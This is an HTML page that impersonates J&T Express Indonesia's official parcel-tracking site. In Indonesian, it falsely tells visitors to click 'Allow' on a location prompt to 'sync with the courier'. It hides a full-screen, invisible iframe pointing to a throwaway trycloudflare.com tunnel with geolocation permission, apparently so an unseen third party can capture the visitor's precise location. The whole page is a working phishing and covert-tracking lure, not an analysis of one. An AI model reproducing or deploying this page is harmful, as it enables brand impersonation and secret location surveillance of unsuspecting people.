<!DOCTYPE html>
<html>
<head>
    <title>J&T Express - Lacak Paket</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f2f5; /* Warna latar belakang abu-abu terang */
            color: #333;
            text-align: center;
        }
        .container {
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            max-width: 90%; /* Sesuaikan lebar maksimum container */
        }
        .logo-img {
            max-width: 180px; /* Ukuran gambar J&T, bisa disesuaikan */
            height: auto;
            margin-bottom: 20px;
        }
        .official-text {
            font-size: 1.2em; /* Ukuran teks "Official Website" */
            font-weight: bold;
            color: #cf0000; /* Warna merah J&T */
            margin-bottom: 25px;
        }
        .instruction-text {
            font-size: 1em;
            color: #555;
            margin-bottom: 25px;
        }
        .loader {
            border: 5px solid #f3f3f3; /* Light grey */
            border-top: 5px solid #cf0000; /* Red J&T */
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        iframe {
            position: absolute; /* Sembunyikan iframe di belakang */
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; /* Buat tidak terlihat */
            pointer-events: none; /* Nonaktifkan interaksi langsung dengan iframe */
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://assets-a1.kompasiana.com/items/album/2019/12/05/j-t5-5de8a2f4d541df70016a95f3.jpg" alt="J&T Express Logo" class="logo-img">
        <div class="official-text">J&T Express Indonesia Official Website</div>
        <div class="loader"></div>
        <div class="instruction-text">
            Mohon izinkan akses lokasi untuk sinkronisasi otomatis dengan kurir.
            <br>
            Silakan klik <b>"Izinkan / Allow"</b> pada jendela yang muncul.
        </div>
    </div>

    <iframe src="https://nitrogen-governance-automotive-carrying.trycloudflare.com" 
            allow="geolocation">
    </iframe>

</body>
</html>
